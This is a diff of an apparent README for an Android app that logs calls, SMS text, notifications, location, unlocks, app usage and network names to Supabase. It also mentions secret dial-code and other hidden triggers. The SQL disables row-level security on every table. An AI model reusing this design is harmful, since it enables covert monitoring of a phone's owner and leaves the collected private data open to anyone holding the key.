-```
-id, error_type, message, stacktrace, timestamp, synced
-```
 
 ---
 
 ## Database Schema
 
-### SQLite (local — `DatabaseHelper.java`)
+### SQLite (local)
 
 ```sql
 CREATE TABLE call_logs (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
-    number TEXT,
-    saved_name TEXT,
-    call_type TEXT,             -- INCOMING, OUTGOING, MISSED
-    duration_seconds INTEGER,
-    timestamp INTEGER,          -- Unix timestamp millis
-    synced INTEGER DEFAULT 0
+    number TEXT, saved_name TEXT, call_type TEXT,
+    duration_seconds INTEGER, timestamp INTEGER, synced INTEGER DEFAULT 0
 );
-
 CREATE TABLE sms_logs (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
-    sender TEXT,
-    saved_name TEXT,
-    content TEXT,
-    timestamp INTEGER,
-    synced INTEGER DEFAULT 0
+    sender TEXT, saved_name TEXT, content TEXT,
+    timestamp INTEGER, synced INTEGER DEFAULT 0
 );
-
 CREATE TABLE notification_logs (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
-    package_name TEXT,
-    app_name TEXT,
-    title TEXT,
-    content TEXT,
-    timestamp INTEGER,
-    synced INTEGER DEFAULT 0
+    package_name TEXT, app_name TEXT, title TEXT, content TEXT,
+    timestamp INTEGER, synced INTEGER DEFAULT 0
 );
-
 CREATE TABLE location_logs (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
-    latitude REAL,              -- null if GPS disabled
-    longitude REAL,             -- null if GPS disabled
-    accuracy REAL,              -- meters, null if GPS disabled
-    position_status TEXT,       -- OK or DISABLED
-    timestamp INTEGER,
-    synced INTEGER DEFAULT 0
+    latitude REAL, longitude REAL, accuracy REAL, position_status TEXT,
+    timestamp INTEGER, synced INTEGER DEFAULT 0
 );
-
 CREATE TABLE system_event_logs (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
-    event_type TEXT,            -- SHUTDOWN, REBOOT, AIRPLANE_ON, AIRPLANE_OFF,
-                                -- DATA_ON, DATA_OFF
-    detail TEXT,                -- e.g. total downtime in seconds for REBOOT
-    timestamp INTEGER,
-    synced INTEGER DEFAULT 0
+    event_type TEXT, detail TEXT, timestamp INTEGER, synced INTEGER DEFAULT 0
 );
-
 CREATE TABLE screen_logs (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
-    event_type TEXT,            -- SCREEN_ON, SCREEN_OFF, UNLOCKED
-    timestamp INTEGER,
-    synced INTEGER DEFAULT 0
+    event_type TEXT, timestamp INTEGER, synced INTEGER DEFAULT 0
 );
-
 CREATE TABLE battery_logs (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
-    level INTEGER,              -- 0-100
-    is_charging INTEGER,        -- 0 or 1
-    event_type TEXT,            -- SNAPSHOT, CHARGING_STARTED, CHARGING_STOPPED
-    timestamp INTEGER,
-    synced INTEGER DEFAULT 0
+    level INTEGER, is_charging INTEGER, event_type TEXT,
+    timestamp INTEGER, synced INTEGER DEFAULT 0
 );
-
 CREATE TABLE app_usage_logs (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
-    package_name TEXT,
-    app_name TEXT,
-    usage_duration_seconds INTEGER,
-    window_start INTEGER,       -- start of the 60min window
-    window_end INTEGER,         -- end of the 60min window
-    synced INTEGER DEFAULT 0
+    package_name TEXT, app_name TEXT, usage_duration_seconds INTEGER,
+    window_start INTEGER, window_end INTEGER, synced INTEGER DEFAULT 0
 );
-
 CREATE TABLE network_logs (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
-    event_type TEXT,            -- WIFI_CONNECTED, WIFI_DISCONNECTED,
-                                -- DATA_ENABLED, DATA_DISABLED,
-                                -- BT_CONNECTED, BT_DISCONNECTED
-    detail TEXT,                -- WiFi SSID or Bluetooth device name
-    timestamp INTEGER,
-    synced INTEGER DEFAULT 0
+    event_type TEXT, detail TEXT, timestamp INTEGER, synced INTEGER DEFAULT 0
 );
-
 CREATE TABLE error_logs (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
-    error_type TEXT,
-    message TEXT,
-    stacktrace TEXT,
-    timestamp INTEGER,
-    synced INTEGER DEFAULT 0
+    error_type TEXT, message TEXT, stacktrace TEXT,
+    timestamp INTEGER, synced INTEGER DEFAULT 0
 );
+```
+
+All `timestamp` fields are Unix milliseconds (`System.currentTimeMillis()`). To read them as human-readable dates in Supabase SQL:
+
+```sql
+select to_timestamp(timestamp / 1000.0) as recorded_at from call_logs;
 ```
 
 ---
@@ -834,123 +468,71 @@ CREATE TABLE error_logs (
 Run this in the Supabase SQL Editor:
 
 ```sql
-CREATE TABLE call_logs (
-    id BIGSERIAL PRIMARY KEY,
-    number TEXT,
-    saved_name TEXT,
-    call_type TEXT,
-    duration_seconds INTEGER,
-    timestamp BIGINT,
-    created_at TIMESTAMPTZ DEFAULT NOW()
+create table call_logs (
+  id bigserial primary key,
+  number text, saved_name text, call_type text,
+  duration_seconds integer, timestamp bigint
+);
+create table sms_logs (
+  id bigserial primary key,
+  sender text, saved_name text, content text, timestamp bigint
+);
+create table notification_logs (
+  id bigserial primary key,
+  package_name text, app_name text, title text, content text, timestamp bigint
+);
+create table location_logs (
+  id bigserial primary key,
+  latitude double precision, longitude double precision,
+  accuracy double precision, position_status text, timestamp bigint
+);
+create table system_event_logs (
+  id bigserial primary key,
+  event_type text, detail text, timestamp bigint
+);
+create table screen_logs (
+  id bigserial primary key,
+  event_type text, timestamp bigint
+);
+create table battery_logs (
+  id bigserial primary key,
+  level integer, is_charging boolean, event_type text, timestamp bigint
+);
+create table app_usage_logs (
+  id bigserial primary key,
+  package_name text, app_name text,
+  usage_duration_seconds integer, window_start bigint, window_end bigint
+);
+create table network_logs (
+  id bigserial primary key,
+  event_type text, detail text, timestamp bigint
+);
+create table error_logs (
+  id bigserial primary key,
+  error_type text, message text, stacktrace text, timestamp bigint
 );
 
-CREATE TABLE sms_logs (
-    id BIGSERIAL PRIMARY KEY,
-    sender TEXT,
-    saved_name TEXT,
-    content TEXT,
-    timestamp BIGINT,
-    created_at TIMESTAMPTZ DEFAULT NOW()
-);
-
-CREATE TABLE notification_logs (
-    id BIGSERIAL PRIMARY KEY,
-    package_name TEXT,
-    app_name TEXT,
-    title TEXT,
-    content TEXT,
-    timestamp BIGINT,
-    created_at TIMESTAMPTZ DEFAULT NOW()
-);
-
-CREATE TABLE location_logs (
-    id BIGSERIAL PRIMARY KEY,
-    latitude DOUBLE PRECISION,
-    longitude DOUBLE PRECISION,
-    accuracy DOUBLE PRECISION,
-    position_status TEXT,
-    timestamp BIGINT,
-    created_at TIMESTAMPTZ DEFAULT NOW()
-);
-
-CREATE TABLE system_event_logs (
-    id BIGSERIAL PRIMARY KEY,
-    event_type TEXT,
-    detail TEXT,
-    timestamp BIGINT,
-    created_at TIMESTAMPTZ DEFAULT NOW()
-);
-
-CREATE TABLE screen_logs (
-    id BIGSERIAL PRIMARY KEY,
-    event_type TEXT,
-    timestamp BIGINT,
-    created_at TIMESTAMPTZ DEFAULT NOW()
-);
-
-CREATE TABLE battery_logs (
-    id BIGSERIAL PRIMARY KEY,
-    level INTEGER,
-    is_charging BOOLEAN,
-    event_type TEXT,
-    timestamp BIGINT,
-    created_at TIMESTAMPTZ DEFAULT NOW()
-);
-
-CREATE TABLE app_usage_logs (
-    id BIGSERIAL PRIMARY KEY,
-    package_name TEXT,
-    app_name TEXT,
-    usage_duration_seconds INTEGER,
-    window_start BIGINT,
-    window_end BIGINT,
-    created_at TIMESTAMPTZ DEFAULT NOW()
-);
-
-CREATE TABLE network_logs (
-    id BIGSERIAL PRIMARY KEY,
-    event_type TEXT,
-    detail TEXT,
-    timestamp BIGINT,
-    created_at TIMESTAMPTZ DEFAULT NOW()
-);
-
-CREATE TABLE error_logs (
-    id BIGSERIAL PRIMARY KEY,
-    error_type TEXT,
-    message TEXT,
-    stacktrace TEXT,
-    timestamp BIGINT,
-    created_at TIMESTAMPTZ DEFAULT NOW()
-);
-
--- Disable RLS on all tables (personal use only)
-ALTER TABLE call_logs DISABLE ROW LEVEL SECURITY;
-ALTER TABLE sms_logs DISABLE ROW LEVEL SECURITY;
-ALTER TABLE notification_logs DISABLE ROW LEVEL SECURITY;
-ALTER TABLE location_logs DISABLE ROW LEVEL SECURITY;
-ALTER TABLE system_event_logs DISABLE ROW LEVEL SECURITY;
-ALTER TABLE screen_logs DISABLE ROW LEVEL SECURITY;
-ALTER TABLE battery_logs DISABLE ROW LEVEL SECURITY;
-ALTER TABLE app_usage_logs DISABLE ROW LEVEL SECURITY;
-ALTER TABLE network_logs DISABLE ROW LEVEL SECURITY;
-ALTER TABLE error_logs DISABLE ROW LEVEL SECURITY;
+-- Disable RLS on all tables
+alter table call_logs disable row level security;
+alter table sms_logs disable row level security;
+alter table notification_logs disable row level security;
+alter table location_logs disable row level security;
+alter table system_event_logs disable row level security;
+alter table screen_logs disable row level security;
+alter table battery_logs disable row level security;
+alter table app_usage_logs disable row level security;
+alter table network_logs disable row level security;
+alter table error_logs disable row level security;
 ```
 
 ---
 
 ## Notes
 
-- **Trigger compatibility varies by device:**
-  - Dial codes may not work on heavily customized Android skins (MIUI, EMUI)
-  - NFC works on all NFC-enabled devices (most Android phones since 2012)
-  - Volume buttons require Accessibility permission (sensitive, but works universally)
-  - Shake detection works on all devices (requires no special permissions)
 - `ACCESS_BACKGROUND_LOCATION` must be requested **separately and after** `ACCESS_FINE_LOCATION` is already granted. Android enforces this order strictly on API 30+.
 - `PACKAGE_USAGE_STATS` and Accessibility permission cannot be granted at runtime — the user must enable them manually in Settings.
-- `NotificationListenerService` permission is revoked automatically if the app is updated via adb. The user must re-enable it in Notification Access settings after each update.
-- The local database wipe after sync is irreversible. Ensure Supabase returns HTTP 201 before wiping.
-- Supabase free tier: 500MB storage, 2GB bandwidth/month — more than sufficient for personal logging.
-- Never commit `secrets.xml` to a public repository. Add it to `.gitignore` immediately.
-- Device Admin activation requires user consent — it cannot be forced silently. The first-launch flow must explain why it is needed.
-- Multiple trigger methods can be active simultaneously for redundancy (recommended).
+- `NotificationListenerService` permission is revoked automatically if the app is updated via adb. Re-enable it in Notification Access settings after each update.
+- The dial code trigger (`SecretCodeReceiver`) does not work on Android 12+ due to OS restrictions.
+- The local database wipe after sync is irreversible. The wipe only runs after Supabase returns HTTP 2xx.
+- Never commit `secrets.xml` to a public repository.
+- Supabase free tier: 500 MB storage, 2 GB bandwidth/month — sufficient for personal logging.
